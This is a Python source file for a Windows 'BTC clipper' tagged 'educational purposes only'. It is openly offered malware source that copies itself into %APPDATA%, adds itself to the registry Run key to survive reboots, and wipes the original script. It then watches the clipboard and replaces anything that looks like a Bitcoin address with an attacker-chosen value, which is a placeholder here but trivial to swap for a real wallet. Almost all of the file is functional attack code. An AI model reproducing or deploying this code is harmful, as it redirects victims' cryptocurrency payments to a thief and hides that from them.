import time
import subprocess
import ctypes
import re
import winreg 
import os
import sys
import logging

# DEVELOPED BY NIGHTFALL#2512 / GITHUB.COM/NIGHTFALLGT / EDUCATIONAL PURPOSES ONLY

BTC_ADDRESS = 'you have been infected by btc clipper malware'

#Add code/ message in current.py file after deleting current .py file contents after replicating.
SELF_DESTRUCT_MESSAGE = 'File contents have been deleted. \n To remove the \
btc clipper, Delete it from %APPDATA% and delete it from Startup in the Registry Editor' 

logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt='%H:%M:%S', level=logging.DEBUG) #debug mode on 

FirstTime = True

class Clipboard:
    def __init__(self):
        logging.debug('Clipboard init')
        self.kernel32 = ctypes.windll.kernel32
        self.kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        self.kernel32.GlobalLock.restype = ctypes.c_void_p
        self.kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
        
        self.user32 = ctypes.windll.user32
        self.user32.GetClipboardData.restype = ctypes.c_void_p
    
    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data  = self.user32.GetClipboardData(1)
            data_locked = self.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            self.kernel32.GlobalUnlock(data_locked)
            
            try:
                return value.decode()
            
            except Exception as e:
                logging.debug(e)
                return ''

    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

class Methods:
    #regex = '\w{25,}'
    regex = '^(bc1|[13])[a-zA-HJ-NP-Z0-9]+'

    @staticmethod
    def set_clipboard(text):
        logging.debug('Set clipboard')
        return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
    
    def check(self, text):
        try:
            regex_check = re.findall(self.regex, text)
            if regex_check:
                return True

        except Exception as e:
            logging.debug(e)
        
        return False

def add_to_registry():
   logging.debug('Adding to startup registry')
   path = os.getenv('APPDATA')

   logging.debug(path)

   file_name= sys.argv[0] #BACK

   address = os.getenv('LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'

   key1 = winreg.HKEY_CURRENT_USER
   key_value1 ="SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

   open_ =winreg.CreateKeyEx(key1,key_value1,0,winreg.KEY_WRITE)
    
   if open_:
        logging.debug('Registry Key created')

   winreg.SetValueEx(open_,"BTC CLIPPER",0,winreg.REG_SZ,address)
   
   open_.Close()

def replicate():
    virus_code = []

    with open(sys.argv[0], 'r', encoding='utf-8') as f:
        lines = f.readlines()
        for line in lines:
            virus_code.append(line)

    path =  os.getenv('APPDATA') + '\\'
    hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0] #BACK
    logging.debug('Hide path: %s '% hide_path)

    with open(hide_path, 'w', encoding='utf-8') as f:
        for line in virus_code:
            f.write(line)
            if line == 'FirstTime = True\n':
                logging.debug(line)
                f.write('FirstTime = False\n')


    logging.debug('Finished replicating to APPDATA')

def self_destruct():
    logging.debug('Self destruct called.')
    with open(sys.argv[0], 'w', encoding='utf-8') as f:
        f.write(SELF_DESTRUCT_MESSAGE)

def start():
    m = Methods()
    while True:
        with Clipboard() as clipboard: 
            time.sleep(0.1)
            target_clipboard = clipboard
            logging.debug('Text found in clipboard: %s' % target_clipboard) 

        if m.check(target_clipboard):
            logging.debug('Probably a btc address.') 
            logging.debug('Original clipboard: %s' % target_clipboard)
            logging.debug('Setting clipboard to %s' % BTC_ADDRESS)
            m.set_clipboard(BTC_ADDRESS)         
        
        else:
            logging.debug('Not a btc address?')

        time.sleep(1)

def main():
    if FirstTime:
        logging.debug('Starting BTC Clipper')
        replicate()
        add_to_registry()
        self_destruct()
        hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]
        start()
        
    else:
        start()

main()

